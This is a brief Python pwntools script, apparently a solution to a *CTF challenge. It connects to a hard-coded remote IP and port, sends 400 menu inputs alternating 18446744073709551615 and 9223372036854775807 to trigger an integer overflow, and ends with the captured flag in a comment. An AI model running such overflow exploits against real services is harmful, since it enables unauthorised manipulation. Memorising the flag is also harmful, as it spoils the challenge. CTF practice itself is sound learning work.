from pwn import remote,context
context(log_level=0)
HOST, PORT = "52.163.228.53", 8082
REM = remote(HOST,PORT)
# REM.interactive()

for i in range(400):
    REM.sendline(b'1')
    if i%2:
        REM.sendline(b'18446744073709551615')
    else:
        REM.sendline(b'9223372036854775807')

REM.interactive()

#*CTF{27d30dad45523cbf88013674a4b5bd29}
